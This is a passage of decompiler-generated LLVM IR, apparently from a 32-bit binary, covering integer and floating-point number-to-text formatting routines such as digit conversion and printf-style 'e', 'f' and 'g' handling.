  %v1_804fed3 = icmp eq i1 %v2_804fed1, false
  br i1 %v1_804fed3, label %dec_label_pc_804feee, label %dec_label_pc_804fed5

dec_label_pc_804fed5:                             ; preds = %dec_label_pc_804fecf
  %v1_804fed5 = sub i32 0, %arg2
  %v5_804fed5 = icmp ne i32 %arg2, 0
  store i32 %v1_804fed5, i32* %ecx.global-to-local, align 4
  %v2_804fed7 = zext i1 %v5_804fed5 to i32
  %v3_804fed7 = add i32 %v2_804fed7, %arg3
  %v1_804fee2 = sub i32 0, %v3_804fed7
  store i32 %v1_804fee2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804feee

dec_label_pc_804feee:                             ; preds = %dec_label_pc_804feb4, %dec_label_pc_804fecf, %dec_label_pc_804fed5
  %v0_804fef3 = phi i32 [ %v1_804fecf, %dec_label_pc_804fed5 ], [ %v1_804fecf, %dec_label_pc_804fecf ], [ %arg4, %dec_label_pc_804feb4 ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_804fed5 ], [ 0, %dec_label_pc_804fecf ], [ 0, %dec_label_pc_804feb4 ]
  %div = udiv i32 -1, %v0_804fef3
  %tmp35 = urem i32 -1, %v0_804fef3
  %v1_804fef5 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_804fef9 = load i32, i32* %esi.global-to-local, align 4
  %v12_804fef9 = icmp eq i32 %v1_804fef5, %v1_804fef9
  %v1_804ff03 = icmp eq i1 %v12_804fef9, false
  br i1 %v1_804ff03, label %dec_label_pc_804ff12, label %dec_label_pc_804ff05

dec_label_pc_804ff05:                             ; preds = %dec_label_pc_804feee
  %v1_804ff05 = add i32 %div, 1
  br label %dec_label_pc_804ff12

dec_label_pc_804ff12:                             ; preds = %dec_label_pc_804feee, %dec_label_pc_804ff05
  %stack_var_-20.0.off0 = phi i32 [ %v1_804fef5, %dec_label_pc_804feee ], [ 0, %dec_label_pc_804ff05 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804feee ], [ %v1_804ff05, %dec_label_pc_804ff05 ]
  %v0_804ff12 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804ff12, i32* %ebp.global-to-local, align 4
  %v0_804ff14 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804ff14, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ff1a

dec_label_pc_804ff1a:                             ; preds = %dec_label_pc_804ff59, %dec_label_pc_804ff12
  %v0_804ff51 = phi i32 [ %v0_804ff6a, %dec_label_pc_804ff59 ], [ %v0_804ff12, %dec_label_pc_804ff12 ]
  %v0_804ff1e = phi i32 [ %v1_804ff6c, %dec_label_pc_804ff59 ], [ %v0_804ff14, %dec_label_pc_804ff12 ]
  %v1_804ff1a = icmp eq i32 %v0_804ff1e, 0
  br i1 %v1_804ff1a, label %dec_label_pc_804ff51, label %dec_label_pc_804ff1e

dec_label_pc_804ff1e:                             ; preds = %dec_label_pc_804ff1a
  %v0_804ff22 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_804ff1e, %v0_804ff22
  %tmp36 = urem i32 %v0_804ff1e, %v0_804ff22
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_804ff51, %v0_804ff22
  %tmp37 = urem i32 %v0_804ff51, %v0_804ff22
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_804ff35 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_804ff39 = add i32 %tmp37, %v6_804ff35
  %v8_804ff3f = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_804ff44 = add i32 %div8, %v8_804ff3f
  store i32 %v2_804ff44, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_804ff39, %v0_804ff22
  %tmp38 = urem i32 %v2_804ff39, %v0_804ff22
  %v2_804ff4c = add i32 %div9, %v2_804ff44
  br label %dec_label_pc_804ff59

dec_label_pc_804ff51:                             ; preds = %dec_label_pc_804ff1a
  %v0_804ff55 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_804ff51, %v0_804ff55
  %tmp39 = urem i32 %v0_804ff51, %v0_804ff55
  br label %dec_label_pc_804ff59

dec_label_pc_804ff59:                             ; preds = %dec_label_pc_804ff1e, %dec_label_pc_804ff51
  %v0_804ff5f = phi i32 [ %tmp38, %dec_label_pc_804ff1e ], [ %tmp39, %dec_label_pc_804ff51 ]
  %storemerge = phi i32 [ %v2_804ff4c, %dec_label_pc_804ff1e ], [ %div12, %dec_label_pc_804ff51 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804ff59 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ff59 = add i32 %v0_804ff59, -1
  store i32 %v1_804ff59, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_804ff5f, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_804ff5f
  %v8_804ff5f = trunc i32 %storemerge14.in to i8
  %v3_804ff68 = inttoptr i32 %v1_804ff59 to i8*
  store i8 %v8_804ff5f, i8* %v3_804ff68, align 1
  %v0_804ff6a = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ff6c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ff6c = or i32 %v1_804ff6c, %v0_804ff6a
  %v3_804ff6c = icmp eq i32 %v2_804ff6c, 0
  %v1_804ff6e = icmp eq i1 %v3_804ff6c, false
  br i1 %v1_804ff6e, label %dec_label_pc_804ff1a, label %dec_label_pc_804ff70

dec_label_pc_804ff70:                             ; preds = %dec_label_pc_804ff59
  %v4_804ff70 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_804ff70, label %dec_label_pc_804ff7b, label %dec_label_pc_804ff77

dec_label_pc_804ff77:                             ; preds = %dec_label_pc_804ff70
  %v0_804ff77 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ff77 = add i32 %v0_804ff77, -1
  store i32 %v1_804ff77, i32* %edi.global-to-local, align 4
  %v1_804ff78 = inttoptr i32 %v1_804ff77 to i8*
  store i8 45, i8* %v1_804ff78, align 1
  br label %dec_label_pc_804ff7b

dec_label_pc_804ff7b:                             ; preds = %dec_label_pc_804ff70, %dec_label_pc_804ff77
  %v0_804ff7e = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804ff7e

; uselistorder directives
  uselistorder i32 %v2_804ff39, { 1, 0 }
  uselistorder i32 %v0_804ff22, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804ff1e, { 1, 0, 2 }
  uselistorder i32 %v0_804ff51, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804fef3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ff7b, { 1, 0 }
  uselistorder label %dec_label_pc_804ff59, { 1, 0 }
  uselistorder label %dec_label_pc_804ff12, { 1, 0 }
  uselistorder label %dec_label_pc_804feee, { 2, 1, 0 }
}

define i32 @function_804ff88() local_unnamed_addr {
dec_label_pc_804ff88:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp102 = call i16 @__decompiler_undefined_function_3()
  %tmp111 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ff89 = load i32, i32* @edi, align 4
  %v0_804ff8a = load i32, i32* @esi, align 4
  %v0_804ff8b = load i32, i32* @ebx, align 4
  store i32 %v0_804ff8b, i32* %stack_var_-16, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v4_804ffa0 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804ffa0 = add i3 %v4_804ffa0, -1
  store i3 %v5_804ffa0, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804ffa7 = add i32 %tmp111, 4
  %v2_804ffa7 = inttoptr i32 %v1_804ffa7 to i32*
  %v3_804ffa7 = load i32, i32* %v2_804ffa7, align 4
  store i32 %v3_804ffa7, i32* %eax.global-to-local, align 4
  %v1_804ffae = add i32 %tmp111, 8
  %v2_804ffae = inttoptr i32 %v1_804ffae to i8*
  %v3_804ffae = load i8, i8* %v2_804ffae, align 1
  %v4_804ffae = zext i8 %v3_804ffae to i32
  %v5_804ffae = load i32, i32* @ecx, align 4
  %v6_804ffae = and i32 %v5_804ffae, -256
  %v7_804ffae = or i32 %v6_804ffae, %v4_804ffae
  store i32 %v7_804ffae, i32* %ecx.global-to-local, align 4
  %v1_804ffb1 = inttoptr i32 %tmp111 to i32*
  %v2_804ffb1 = load i32, i32* %v1_804ffb1, align 4
  store i32 %v2_804ffb1, i32* %ebp.global-to-local, align 4
  %v3_804ffb3 = and i32 %v3_804ffa7, -256
  %v4_804ffb3 = or i32 %v3_804ffb3, %v4_804ffae
  %v1_804ffb9 = or i32 %v4_804ffb3, 32
  %v3_804ffb9 = trunc i32 %v1_804ffb9 to i8
  store i32 %v1_804ffb9, i32* %eax.global-to-local, align 4
  %v10_804ffc4 = icmp eq i8 %v3_804ffb9, 97
  %v1_804ffc6 = icmp eq i1 %v10_804ffc4, false
  br i1 %v1_804ffc6, label %dec_label_pc_804ffcf, label %dec_label_pc_804ffc8

dec_label_pc_804ffc8:                             ; preds = %dec_label_pc_804ff88
  %v1_804ffc8 = add i32 %v7_804ffae, 6
  %v11_804ffc8 = trunc i32 %v1_804ffc8 to i8
  store i32 %v1_804ffc8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ffcf

dec_label_pc_804ffcf:                             ; preds = %dec_label_pc_804ff88, %dec_label_pc_804ffc8
  %stack_var_-206.0 = phi i8 [ %v3_804ffae, %dec_label_pc_804ff88 ], [ %v11_804ffc8, %dec_label_pc_804ffc8 ]
  %v2_804ffcf = icmp slt i32 %v2_804ffb1, 0
  %v1_804ffd1 = icmp eq i1 %v2_804ffcf, false
  br i1 %v1_804ffd1, label %dec_label_pc_804ffd8, label %dec_label_pc_804ffd3

dec_label_pc_804ffd3:                             ; preds = %dec_label_pc_804ffcf
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ffd8

dec_label_pc_804ffd8:                             ; preds = %dec_label_pc_804ffcf, %dec_label_pc_804ffd3
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_804ffe7 = add i32 %tmp111, 12
  %v2_804ffe7 = inttoptr i32 %v1_804ffe7 to i32*
  %v3_804ffe7 = load i32, i32* %v2_804ffe7, align 4
  store i32 %v3_804ffe7, i32* %eax.global-to-local, align 4
  %v2_804ffea = and i32 %v3_804ffe7, 2
  %v3_804ffea = icmp eq i32 %v2_804ffea, 0
  br i1 %v3_804ffea, label %dec_label_pc_804fff8, label %dec_label_pc_8050004

dec_label_pc_804fff8:                             ; preds = %dec_label_pc_804ffd8
  %v2_804fff8 = urem i32 %v3_804ffe7, 2
  %tmp142 = trunc i32 %v2_804fff8 to i8
  %tmp = sub nsw i8 0, %tmp142
  %tmp143 = and i8 %tmp, 32
  br label %dec_label_pc_8050004

dec_label_pc_8050004:                             ; preds = %dec_label_pc_804fff8, %dec_label_pc_804ffd8
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804ffd8 ], [ %tmp143, %dec_label_pc_804fff8 ]
  %v1_8050018 = udiv i32 %v3_804ffe7, 256
  %tmp145 = and i32 %v1_8050018, 68
  %tmp146 = icmp eq i32 %tmp145, 64
  br i1 %tmp146, label %dec_label_pc_805016a, label %dec_label_pc_805008a

dec_label_pc_805008a:                             ; preds = %dec_label_pc_8050004
  store i3 %v4_804ffa0, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_8050091 = add i32 %tmp111, 16
  %v2_8050091 = inttoptr i32 %v1_8050091 to i32*
  store i32 32, i32* %v2_8050091, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_80500a8 = add i8 %stack_var_-206.0, -96
  %v6_80500a8 = sub i8 95, %stack_var_-206.0
  %v7_80500a8 = and i8 %v6_80500a8, %stack_var_-206.0
  %v8_80500a8 = icmp slt i8 %v7_80500a8, 0
  %v9_80500a8 = icmp eq i8 %v4_80500a8, 0
  %v10_80500a8 = icmp slt i8 %v4_80500a8, 0
  %v3_80500ad = icmp eq i1 %v10_80500a8, %v8_80500a8
  %v4_80500ad = icmp eq i1 %v9_80500a8, false
  %v5_80500ad = and i1 %v4_80500ad, %v3_80500ad
  br i1 %v5_80500ad, label %dec_label_pc_80500b4, label %dec_label_pc_80500af

dec_label_pc_80500af:                             ; preds = %dec_label_pc_805008a
  br label %dec_label_pc_80500b4

dec_label_pc_80500b4:                             ; preds = %dec_label_pc_805008a, %dec_label_pc_80500af
  %v2_80500bc = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80500bc, i32* @ecx, align 4
  br label %dec_label_pc_805048f

dec_label_pc_805016a:                             ; preds = %dec_label_pc_8050004
  %v1_8050029 = add i3 %v4_804ffa0, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_805016e = and i32 %v3_804ffe7, -65536
  %v2_8050173 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_8050173, i32* %edx.global-to-local, align 4
  %v1_805017a = udiv i16 %tmp102, 256
  %v2_805017a = zext i16 %v1_805017a to i32
  %v3_805017a = mul nuw nsw i32 %v2_805017a, 256
  %tmp147 = urem i16 %tmp102, 256
  %v4_805016e.masked = zext i16 %tmp147 to i32
  %v11_805017a = or i32 %v4_805016e.masked, %v3_805017a
  %v10_805017a = or i32 %v11_805017a, %v6_805016e
  %v12_805017a = or i32 %v10_805017a, 3072
  store i32 %v12_805017a, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8050029, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805018e

dec_label_pc_805018e:                             ; preds = %dec_label_pc_80501df.dec_label_pc_805018e_crit_edge, %dec_label_pc_805016a
  %v2_80501ab = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_805016a ], [ %v2_80501ab.pre, %dec_label_pc_80501df.dec_label_pc_805018e_crit_edge ]
  %v1_805018e = phi i3 [ %v1_8050029, %dec_label_pc_805016a ], [ %v1_805018e.pre, %dec_label_pc_80501df.dec_label_pc_805018e_crit_edge ]
  %v3_80501b5 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_805016a ], [ %v0_805018e.pre, %dec_label_pc_80501df.dec_label_pc_805018e_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8050173, %dec_label_pc_805016a ], [ %v4_80501b0, %dec_label_pc_80501df.dec_label_pc_805018e_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp148 = fptosi x86_fp80 %v3_80501b5 to i32
  store i32 %tmp148, i32* %eax.global-to-local, align 4
  store i32 %tmp148, i32* %ebx.global-to-local, align 4
  %v5_80501a8 = sitofp i32 %tmp148 to x86_fp80
  %v4_80501ab = fsub x86_fp80 %v2_80501ab, %v5_80501a8
  store i3 %v1_805018e, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80501b0 = add i32 %stack_var_-212.0, 9
  %v4_80501b5 = fmul x86_fp80 %v3_80501b5, %v4_80501ab
  store x86_fp80 %v4_80501b5, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80501b7

dec_label_pc_80501b7:                             ; preds = %dec_label_pc_80501b7.dec_label_pc_80501b7_crit_edge, %dec_label_pc_805018e
  %v0_80501c9 = phi i32 [ %v0_80501c9.pre, %dec_label_pc_80501b7.dec_label_pc_80501b7_crit_edge ], [ %tmp148, %dec_label_pc_805018e ]
  %v0_80501b7 = phi i32 [ %v0_80501b7.pre, %dec_label_pc_80501b7.dec_label_pc_80501b7_crit_edge ], [ 0, %dec_label_pc_805018e ]
  %v1_80501b7 = add i32 %v0_80501b7, 1
  store i32 %v1_80501b7, i32* %esi.global-to-local, align 4
  %v2_80501bc = sub i32 %v4_80501b0, %v1_80501b7
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_80501c9, 10
  %tmp135 = urem i32 %v0_80501c9, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_80501bc, i32* %eax.global-to-local, align 4
  %v1_80501d5 = or i32 %tmp135, 48
  %v8_80501d5 = trunc i32 %v1_80501d5 to i8
  store i32 %v1_80501d5, i32* %edx.global-to-local, align 4
  %v3_80501db = inttoptr i32 %v2_80501bc to i8*
  store i8 %v8_80501d5, i8* %v3_80501db, align 1
  %v7_80501dd = icmp sgt i32 %v1_80501b7, 8
  br i1 %v7_80501dd, label %dec_label_pc_80501df, label %dec_label_pc_80501b7.dec_label_pc_80501b7_crit_edge

dec_label_pc_80501b7.dec_label_pc_80501b7_crit_edge: ; preds = %dec_label_pc_80501b7
  %v0_80501b7.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80501c9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80501b7

dec_label_pc_80501df:                             ; preds = %dec_label_pc_80501b7
  %v0_80501df = load i32, i32* @edi, align 4
  %v1_80501df = add i32 %v0_80501df, 1
  store i32 %v1_80501df, i32* @edi, align 4
  %v7_80501e3 = icmp sgt i32 %v1_80501df, 2
  br i1 %v7_80501e3, label %dec_label_pc_80501e5, label %dec_label_pc_80501df.dec_label_pc_805018e_crit_edge

dec_label_pc_80501df.dec_label_pc_805018e_crit_edge: ; preds = %dec_label_pc_80501df
  %v0_805018e.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805018e.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80501ab.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805018e

dec_label_pc_80501e5:                             ; preds = %dec_label_pc_80501df
  %v0_80501e5 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80501e5 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80501e5, x86_fp80* %st0.global-to-local, align 4
  %v2_80501e7 = add i3 %v0_80501e5, 2
  store i3 %v2_80501e7, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80501e9 = add i8 %stack_var_-206.0, -96
  %v6_80501e9 = sub i8 95, %stack_var_-206.0
  %v7_80501e9 = and i8 %v6_80501e9, %stack_var_-206.0
  %v8_80501e9 = icmp slt i8 %v7_80501e9, 0
  %v9_80501e9 = icmp eq i8 %v4_80501e9, 0
  %v10_80501e9 = icmp slt i8 %v4_80501e9, 0
  %v3_80501ee = icmp eq i1 %v10_80501e9, %v8_80501e9
  %v4_80501ee = icmp eq i1 %v9_80501e9, false
  %v5_80501ee = and i1 %v4_80501ee, %v3_80501ee
  br i1 %v5_80501ee, label %dec_label_pc_80501fd, label %dec_label_pc_80501f0

dec_label_pc_80501f0:                             ; preds = %dec_label_pc_80501e5
  %v4_80501f0 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_80501fd

dec_label_pc_80501fd:                             ; preds = %dec_label_pc_80501e5, %dec_label_pc_80501f0
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_80501e5 ], [ %v4_80501f0, %dec_label_pc_80501f0 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80501e5 ], [ 69, %dec_label_pc_80501f0 ]
  %v12_80501fd = icmp eq i8 %stack_var_-206.1, 103
  %v1_8050202 = icmp eq i1 %v12_80501fd, false
  br i1 %v1_8050202, label %dec_label_pc_805020b, label %dec_label_pc_8050204

dec_label_pc_8050204:                             ; preds = %dec_label_pc_80501fd
  %v0_8050204 = load i32, i32* %ebp.global-to-local, align 4
  %tmp136 = icmp slt i32 %v0_8050204, 1
  br i1 %tmp136, label %dec_label_pc_8050212, label %dec_label_pc_8050208

dec_label_pc_8050208:                             ; preds = %dec_label_pc_8050204
  %v1_8050208 = add i32 %v0_8050204, -1
  store i32 %v1_8050208, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050212

dec_label_pc_805020b:                             ; preds = %dec_label_pc_80501fd
  %v12_805020b = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_805020b, label %dec_label_pc_8050216, label %dec_label_pc_805020b.dec_label_pc_8050212_crit_edge

dec_label_pc_805020b.dec_label_pc_8050212_crit_edge: ; preds = %dec_label_pc_805020b
  %v0_8050212.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050212

dec_label_pc_8050212:                             ; preds = %dec_label_pc_805020b.dec_label_pc_8050212_crit_edge, %dec_label_pc_8050204, %dec_label_pc_8050208
  %v0_8050212 = phi i32 [ %v0_8050212.pre, %dec_label_pc_805020b.dec_label_pc_8050212_crit_edge ], [ %v0_8050204, %dec_label_pc_8050204 ], [ %v1_8050208, %dec_label_pc_8050208 ]
  store i32 %v0_8050212, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050243

dec_label_pc_8050216:                             ; preds = %dec_label_pc_805020b
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_805021a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805021a = add i32 %v0_805021a, -1
  store i32 %v2_805021a, i32* %ebx.global-to-local, align 4
  %v5_8050221 = icmp slt i32 %v2_805021a, -1
  br i1 %v5_8050221, label %dec_label_pc_8050223, label %dec_label_pc_8050243

dec_label_pc_8050223:                             ; preds = %dec_label_pc_8050216
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805022b = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_805022b, i32* %eax.global-to-local, align 4
  %v4_8050233 = bitcast i32* %stack_var_-72 to i8*
  %v5_8050233 = call i32 @function_804d178(i8* %v4_8050233, i32 48, i32 21)
  store i32 %v5_8050233, i32* %eax.global-to-local, align 4
  %v0_8050253.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050243

dec_label_pc_8050243:                             ; preds = %dec_label_pc_8050216, %dec_label_pc_8050223, %dec_label_pc_8050212
  %v1_8050263 = phi i32 [ %v0_8050212, %dec_label_pc_8050212 ], [ %v0_8050253.pr.pre, %dec_label_pc_8050223 ], [ %v2_805021a, %dec_label_pc_8050216 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8050256 = icmp sgt i32 %v1_8050263, 20
  br i1 %v7_8050256, label %dec_label_pc_8050258, label %dec_label_pc_8050263

dec_label_pc_8050258:                             ; preds = %dec_label_pc_8050243
  %v2_8050258 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8050258, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050277.preheader

dec_label_pc_8050263:                             ; preds = %dec_label_pc_8050243
  %v0_8050263 = load i32, i32* @esp, align 4
  %v2_8050263 = add i32 %v1_8050263, 165
  %v3_8050263 = add i32 %v2_8050263, %v0_8050263
  store i32 %v3_8050263, i32* %eax.global-to-local, align 4
  %v1_805026a = add i32 %v3_8050263, 2
  store i32 %v1_805026a, i32* %ecx.global-to-local, align 4
  %v2_805026d = inttoptr i32 %v1_805026a to i8*
  %v3_805026d = load i8, i8* %v2_805026d, align 1
  %v4_805026d = add i8 %v3_805026d, -53
  %v9_805026d = sub i8 52, %v3_805026d
  %v10_805026d = and i8 %v9_805026d, %v3_805026d
  %v11_805026d = icmp slt i8 %v10_805026d, 0
  %v13_805026d = icmp slt i8 %v4_805026d, 0
  %v2_8050271 = icmp eq i1 %v13_805026d, %v11_805026d
  %v3_8050271 = zext i1 %v2_8050271 to i32
  br label %dec_label_pc_8050277.preheader

dec_label_pc_8050277.preheader:                   ; preds = %dec_label_pc_8050263, %dec_label_pc_8050258
  %v0_805027762 = phi i32 [ %v1_805026a, %dec_label_pc_8050263 ], [ %v2_8050258, %dec_label_pc_8050258 ]
  %storemerge51 = phi i32 [ %v3_8050271, %dec_label_pc_8050263 ], [ 0, %dec_label_pc_8050258 ]
  store i32 %storemerge51, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050277

dec_label_pc_8050277:                             ; preds = %dec_label_pc_8050277.backedge, %dec_label_pc_8050277.preheader
  %v3_8050278 = phi i32 [ %v3_8050278.pre, %dec_label_pc_8050277.backedge ], [ %storemerge51, %dec_label_pc_8050277.preheader ]
  %v0_8050277 = phi i32 [ %v0_805027a, %dec_label_pc_8050277.backedge ], [ %v0_805027762, %dec_label_pc_8050277.preheader ]
  %v1_8050277 = add i32 %v0_8050277, -1
  store i32 %v1_8050277, i32* %ecx.global-to-local, align 4
  %v1_8050278 = inttoptr i32 %v1_8050277 to i8*
  %v2_8050278 = load i8, i8* %v1_8050278, align 1
  %v4_8050278 = trunc i32 %v3_8050278 to i8
  %v5_8050278 = add i8 %v2_8050278, %v4_8050278
  store i8 %v5_8050278, i8* %v1_8050278, align 1
  %v0_805027a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805027a = inttoptr i32 %v0_805027a to i8*
  %v2_805027a = load i8, i8* %v1_805027a, align 1
  %v3_805027a = zext i8 %v2_805027a to i32
  %v4_805027a = load i32, i32* %edx.global-to-local, align 4
  %v5_805027a = and i32 %v4_805027a, -256
  %v6_805027a = or i32 %v5_805027a, %v3_805027a
  store i32 %v6_805027a, i32* %edx.global-to-local, align 4
  %v7_805027c = icmp eq i8 %v2_805027a, 48
  br i1 %v7_805027c, label %dec_label_pc_8050277.backedge, label %dec_label_pc_8050281

dec_label_pc_8050277.backedge:                    ; preds = %dec_label_pc_8050277, %dec_label_pc_8050281
  %v3_8050278.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050277

dec_label_pc_8050281:                             ; preds = %dec_label_pc_8050277
  %v2_8050281 = add i8 %v2_805027a, -57
  %v7_8050281 = sub i8 56, %v2_805027a
  %v8_8050281 = and i8 %v7_8050281, %v2_805027a
  %v9_8050281 = icmp slt i8 %v8_8050281, 0
  %v10_8050281 = icmp eq i8 %v2_8050281, 0
  %v11_8050281 = icmp slt i8 %v2_8050281, 0
  %v3_8050284 = icmp eq i1 %v11_8050281, %v9_8050281
  %v4_8050284 = icmp eq i1 %v10_8050281, false
  %v5_8050284 = and i1 %v4_8050284, %v3_8050284
  br i1 %v5_8050284, label %dec_label_pc_8050277.backedge, label %dec_label_pc_8050286

dec_label_pc_8050286:                             ; preds = %dec_label_pc_8050281
  %v2_8050286 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8050286, i32* %eax.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_805027a, %v2_8050286
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp144, label %dec_label_pc_8050291, label %dec_label_pc_805029e

dec_label_pc_8050291:                             ; preds = %dec_label_pc_8050286
  store i32 %v2_8050173, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502a7

dec_label_pc_805029e:                             ; preds = %dec_label_pc_8050286
  store i32 %v2_8050286, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8050286, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80502a7

dec_label_pc_80502a7:                             ; preds = %dec_label_pc_8050291, %dec_label_pc_805029e
  %v0_80502a7 = phi i32 [ %v0_805027a, %dec_label_pc_8050291 ], [ %v2_8050286, %dec_label_pc_805029e ]
  %v1_80502a7 = add i32 %v0_80502a7, 1
  store i32 %v1_80502a7, i32* %eax.global-to-local, align 4
  %v2_80502ae = inttoptr i32 %v1_80502a7 to i8*
  store i8 0, i8* %v2_80502ae, align 1
  br i1 %v1_8050202, label %dec_label_pc_80502d4, label %dec_label_pc_80502b9

dec_label_pc_80502b9:                             ; preds = %dec_label_pc_80502a7
  %v0_80502b9 = load i32, i32* %esi.global-to-local, align 4
  %v5_80502bc = icmp slt i32 %v0_80502b9, -4
  br i1 %v5_80502bc, label %dec_label_pc_80502e1, label %dec_label_pc_80502be

dec_label_pc_80502be:                             ; preds = %dec_label_pc_80502b9
  %v1_80502be = load i32, i32* %ebx.global-to-local, align 4
  %v7_80502c0 = icmp slt i32 %v1_80502be, %v0_80502b9
  br i1 %v7_80502c0, label %dec_label_pc_80502e1, label %dec_label_pc_80502c9

